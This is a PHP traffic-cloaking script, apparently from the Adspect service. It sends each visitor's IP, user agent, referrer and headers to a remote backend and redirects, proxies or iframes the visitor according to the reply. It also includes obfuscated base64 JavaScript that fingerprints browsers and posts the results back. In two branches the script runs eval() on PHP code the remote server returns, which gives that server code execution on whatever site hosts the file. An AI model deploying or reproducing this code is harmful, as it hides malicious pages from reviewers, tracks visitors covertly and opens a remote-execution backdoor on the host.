<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('f96e07cf-011c-449b-8154-a541ccc8f5fd', 'redirect', '_', base64_decode('NPQ3jV1uVKA1W2s1gpZNxO4i9Pps9pMweyE+PzzW0Mo=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDViZjk9WycxblhscnlBJywnbG9jYXRpb24nLCdhY3Rpb24nLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnY2FudmFzJywnODQyMWNuZXFwUScsJ2NvbnNvbGUnLCd2YWx1ZScsJ3B1c2gnLCdjcmVhdGVFdmVudCcsJ3RvU3RyaW5nJywnNjU0MDJhRWxoZk0nLCd0eXBlJywnZm9ybScsJ2FwcGVuZENoaWxkJywnaHJlZicsJzEwMjQxNDRXZ0VQS0wnLCdsZW5ndGgnLCdoaWRkZW4nLCdtZXNzYWdlJywnY3JlYXRlRWxlbWVudCcsJ3dlYmdsJywndGhlbicsJzExOTYwNTZuTGViSXAnLCdOb3RpZmljYXRpb24nLCd0b3VjaEV2ZW50JywncGVybWlzc2lvbicsJ25hdmlnYXRvcicsJ3Blcm1pc3Npb25zJywnc3RyaW5naWZ5JywnaW5wdXQnLCc2MTQ1ODVOQWRhZmonLCd3aW5kb3cnLCdVTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCcsJ2dldFBhcmFtZXRlcicsJ2RvY3VtZW50JywnZ2V0VGltZXpvbmVPZmZzZXQnLCdvYmplY3QnLCdlcnJvcnMnLCcxNTQwMjVkRHl2aVQnLCdnZXRDb250ZXh0JywnMTA3WXZTY2tIJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ2RvY3VtZW50RWxlbWVudCcsJ1VOTUFTS0VEX1ZFTkRPUl9XRUJHTCcsJ25vdGlmaWNhdGlvbnMnLCduYW1lJywnOTczMDA1UFdheXlSJywnc2NyZWVuJywndGltZXpvbmVPZmZzZXQnXTt2YXIgXzB4MWMzOT1mdW5jdGlvbihfMHg1NDJmY2YsXzB4ZjEyNzMxKXtfMHg1NDJmY2Y9XzB4NTQyZmNmLTB4MTcwO3ZhciBfMHg1YmY5MmY9XzB4NWJmOVtfMHg1NDJmY2ZdO3JldHVybiBfMHg1YmY5MmY7fTsoZnVuY3Rpb24oXzB4NDEwYzNiLF8weDE5NTA4ZCl7dmFyIF8weDMwY2IxZj1fMHgxYzM5O3doaWxlKCEhW10pe3RyeXt2YXIgXzB4MjA3MzhlPS1wYXJzZUludChfMHgzMGNiMWYoMHgxODUpKSpwYXJzZUludChfMHgzMGNiMWYoMHgxOTMpKSstcGFyc2VJbnQoXzB4MzBjYjFmKDB4MTgzKSkrLXBhcnNlSW50KF8weDMwY2IxZigweDE5ZSkpKy1wYXJzZUludChfMHgzMGNiMWYoMHgxOTkpKStwYXJzZUludChfMHgzMGNiMWYoMHgxOGUpKSpwYXJzZUludChfMHgzMGNiMWYoMHgxOGIpKStwYXJzZUludChfMHgzMGNiMWYoMHgxNzMpKStwYXJzZUludChfMHgzMGNiMWYoMHgxN2IpKTtpZihfMHgyMDczOGU9PT1fMHgxOTUwOGQpYnJlYWs7ZWxzZSBfMHg0MTBjM2JbJ3B1c2gnXShfMHg0MTBjM2JbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDJiNWQ2Myl7XzB4NDEwYzNiWydwdXNoJ10oXzB4NDEwYzNiWydzaGlmdCddKCkpO319fShfMHg1YmY5LDB4OWMwMzQpLGZ1bmN0aW9uKCl7dmFyIF8weDFiZThhOT1fMHgxYzM5O2Z1bmN0aW9uIF8weDQ4N2FhZCgpe3ZhciBfMHgyMmJmNWU9XzB4MWMzOTtfMHgzNWE2NGZbXzB4MjJiZjVlKDB4MTgyKV09XzB4OWMwZjM7dmFyIF8weDFkYzdhYT1kb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKF8weDIyYmY1ZSgweDE5YikpLF8weDE2MjI3Nj1kb2N1bWVudFtfMHgyMmJmNWUoMHgxNzApXShfMHgyMmJmNWUoMHgxN2EpKTtfMHgxZGM3YWFbJ21ldGhvZCddPSdQT1NUJyxfMHgxZGM3YWFbXzB4MjJiZjVlKDB4MTkwKV09d2luZG93W18weDIyYmY1ZSgweDE4ZildW18weDIyYmY1ZSgweDE5ZCldLF8weDE2MjI3NltfMHgyMmJmNWUoMHgxOWEpXT1fMHgyMmJmNWUoMHgxYTApLF8weDE2MjI3NltfMHgyMmJmNWUoMHgxOGEpXT0nZGF0YScsXzB4MTYyMjc2W18weDIyYmY1ZSgweDE5NSldPUpTT05bXzB4MjJiZjVlKDB4MTc5KV0oXzB4MzVhNjRmKSxfMHgxZGM3YWFbXzB4MjJiZjVlKDB4MTljKV0oXzB4MTYyMjc2KSxkb2N1bWVudFsnYm9keSddW18weDIyYmY1ZSgweDE5YyldKF8weDFkYzdhYSksXzB4MWRjN2FhWydzdWJtaXQnXSgpO312YXIgXzB4OWMwZjM9W10sXzB4MzVhNjRmPXt9O3RyeXt2YXIgXzB4MWVhOTZmPWZ1bmN0aW9uKF8weGMxOTg1ZSl7dmFyIF8weDE3MjE1MT1fMHgxYzM5O2lmKCdvYmplY3QnPT09dHlwZW9mIF8weGMxOTg1ZSYmbnVsbCE9PV8weGMxOTg1ZSl7dmFyIF8weDIyYTI5MT1mdW5jdGlvbihfMHgyYjYyMTEpe3ZhciBfMHg1MGVlMWE9XzB4MWMzOTt0cnl7dmFyIF8weDNmZTY5Mz1fMHhjMTk4NWVbXzB4MmI2MjExXTtzd2l0Y2godHlwZW9mIF8weDNmZTY5Myl7Y2FzZSBfMHg1MGVlMWEoMHgxODEpOmlmKG51bGw9PT1fMHgzZmU2OTMpYnJlYWs7Y2FzZSdmdW5jdGlvbic6XzB4M2ZlNjkzPV8weDNmZTY5M1tfMHg1MGVlMWEoMHgxOTgpXSgpO31fMHg0YWYwZGRbXzB4MmI2MjExXT1fMHgzZmU2OTM7fWNhdGNoKF8weDI1NzAwNCl7XzB4OWMwZjNbJ3B1c2gnXShfMHgyNTcwMDRbJ21lc3NhZ2UnXSk7fX0sXzB4NGFmMGRkPXt9LF8weDM1MDc2OTtmb3IoXzB4MzUwNzY5IGluIF8weGMxOTg1ZSlfMHgyMmEyOTEoXzB4MzUwNzY5KTt0cnl7dmFyIF8weDMxNjQzNj1PYmplY3RbXzB4MTcyMTUxKDB4MTkxKV0oXzB4YzE5ODVlKTtmb3IoXzB4MzUwNzY5PTB4MDtfMHgzNTA3Njk8XzB4MzE2NDM2W18weDE3MjE1MSgweDE5ZildOysrXzB4MzUwNzY5KV8weDIyYTI5MShfMHgzMTY0MzZbXzB4MzUwNzY5XSk7XzB4NGFmMGRkWychISddPV8weDMxNjQzNjt9Y2F0Y2goXzB4M2Q0NDMyKXtfMHg5YzBmM1sncHVzaCddKF8weDNkNDQzMltfMHgxNzIxNTEoMHgxYTEpXSk7fXJldHVybiBfMHg0YWYwZGQ7fX07XzB4MzVhNjRmWydzY3JlZW4nXT1fMHgxZWE5NmYod2luZG93W18weDFiZThhOSgweDE4YyldKSxfMHgzNWE2NGZbXzB4MWJlOGE5KDB4MTdjKV09XzB4MWVhOTZmKHdpbmRvdyksXzB4MzVhNjRmW18weDFiZThhOSgweDE3NyldPV8weDFlYTk2Zih3aW5kb3dbXzB4MWJlOGE5KDB4MTc3KV0pLF8weDM1YTY0ZltfMHgxYmU4YTkoMHgxOGYpXT1fMHgxZWE5NmYod2luZG93Wydsb2NhdGlvbiddKSxfMHgzNWE2NGZbXzB4MWJlOGE5KDB4MTk0KV09XzB4MWVhOTZmKHdpbmRvd1tfMHgxYmU4YTkoMHgxOTQpXSksXzB4MzVhNjRmW18weDFiZThhOSgweDE4NyldPWZ1bmN0aW9uKF8weDQ3OWViZCl7dmFyIF8weDEzMjdiMD1fMHgxYmU4YTk7dHJ5e3ZhciBfMHg1NDNjYmQ9e307XzB4NDc5ZWJkPV8weDQ3OWViZFsnYXR0cmlidXRlcyddO2Zvcih2YXIgXzB4NGMwZTYxIGluIF8weDQ3OWViZClfMHg0YzBlNjE9XzB4NDc5ZWJkW18weDRjMGU2MV0sXzB4NTQzY2JkW18weDRjMGU2MVsnbm9kZU5hbWUnXV09XzB4NGMwZTYxWydub2RlVmFsdWUnXTtyZXR1cm4gXzB4NTQzY2JkO31jYXRjaChfMHgyOGIxODApe18weDljMGYzW18weDEzMjdiMCgweDE5NildKF8weDI4YjE4MFtfMHgxMzI3YjAoMHgxYTEpXSk7fX0oZG9jdW1lbnRbXzB4MWJlOGE5KDB4MTg3KV0pLF8weDM1YTY0ZltfMHgxYmU4YTkoMHgxN2YpXT1fMHgxZWE5NmYoZG9jdW1lbnQpO3RyeXtfMHgzNWE2NGZbXzB4MWJlOGE5KDB4MThkKV09bmV3IERhdGUoKVtfMHgxYmU4YTkoMHgxODApXSgpO31jYXRjaChfMHgzMmMwMTkpe18weDljMGYzWydwdXNoJ10oXzB4MzJjMDE5W18weDFiZThhOSgweDFhMSldKTt9dHJ5e18weDM1YTY0ZlsnY2xvc3VyZSddPWZ1bmN0aW9uKCl7fVsndG9TdHJpbmcnXSgpO31jYXRjaChfMHg0ODAxZWMpe18weDljMGYzW18weDFiZThhOSgweDE5NildKF8weDQ4MDFlY1tfMHgxYmU4YTkoMHgxYTEpXSk7fXRyeXtfMHgzNWE2NGZbXzB4MWJlOGE5KDB4MTc1KV09ZG9jdW1lbnRbXzB4MWJlOGE5KDB4MTk3KV0oJ1RvdWNoRXZlbnQnKVtfMHgxYmU4YTkoMHgxOTgpXSgpO31jYXRjaChfMHg0MzZmZTIpe18weDljMGYzW18weDFiZThhOSgweDE5NildKF8weDQzNmZlMlsnbWVzc2FnZSddKTt9dHJ5e18weDFlYTk2Zj1mdW5jdGlvbigpe307dmFyIF8weGJhNmNhZD0weDA7XzB4MWVhOTZmW18weDFiZThhOSgweDE5OCldPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHhiYTZjYWQsJyc7fSxjb25zb2xlWydsb2cnXShfMHgxZWE5NmYpLF8weDM1YTY0ZlsndG9zdHJpbmcnXT1fMHhiYTZjYWQ7fWNhdGNoKF8weDFiOGM0OSl7XzB4OWMwZjNbXzB4MWJlOGE5KDB4MTk2KV0oXzB4MWI4YzQ5W18weDFiZThhOSgweDFhMSldKTt9d2luZG93W18weDFiZThhOSgweDE3NyldW18weDFiZThhOSgweDE3OCldWydxdWVyeSddKHsnbmFtZSc6XzB4MWJlOGE5KDB4MTg5KX0pW18weDFiZThhOSgweDE3MildKGZ1bmN0aW9uKF8weDJiZDdiMCl7dmFyIF8weDMyYTZhNT1fMHgxYmU4YTk7XzB4MzVhNjRmW18weDMyYTZhNSgweDE3OCldPVt3aW5kb3dbXzB4MzJhNmE1KDB4MTc0KV1bXzB4MzJhNmE1KDB4MTc2KV0sXzB4MmJkN2IwWydzdGF0ZSddXSxfMHg0ODdhYWQoKTt9LF8weDQ4N2FhZCk7dHJ5e3ZhciBfMHg0NWU5YmE9ZG9jdW1lbnRbXzB4MWJlOGE5KDB4MTcwKV0oXzB4MWJlOGE5KDB4MTkyKSlbXzB4MWJlOGE5KDB4MTg0KV0oXzB4MWJlOGE5KDB4MTcxKSksXzB4MzI3MTI1PV8weDQ1ZTliYVsnZ2V0RXh0ZW5zaW9uJ10oXzB4MWJlOGE5KDB4MTg2KSk7XzB4MzVhNjRmW18weDFiZThhOSgweDE3MSldPXsndmVuZG9yJzpfMHg0NWU5YmFbXzB4MWJlOGE5KDB4MTdlKV0oXzB4MzI3MTI1W18weDFiZThhOSgweDE4OCldKSwncmVuZGVyZXInOl8weDQ1ZTliYVtfMHgxYmU4YTkoMHgxN2UpXShfMHgzMjcxMjVbXzB4MWJlOGE5KDB4MTdkKV0pfTt9Y2F0Y2goXzB4NDcyNDk4KXtfMHg5YzBmM1tfMHgxYmU4YTkoMHgxOTYpXShfMHg0NzI0OThbXzB4MWJlOGE5KDB4MWExKV0pO319Y2F0Y2goXzB4NDYyZjZjKXtfMHg5YzBmM1sncHVzaCddKF8weDQ2MmY2Y1tfMHgxYmU4YTkoMHgxYTEpXSksXzB4NDg3YWFkKCk7fX0oKSk7"></script>
</body>
</html>
<?php exit;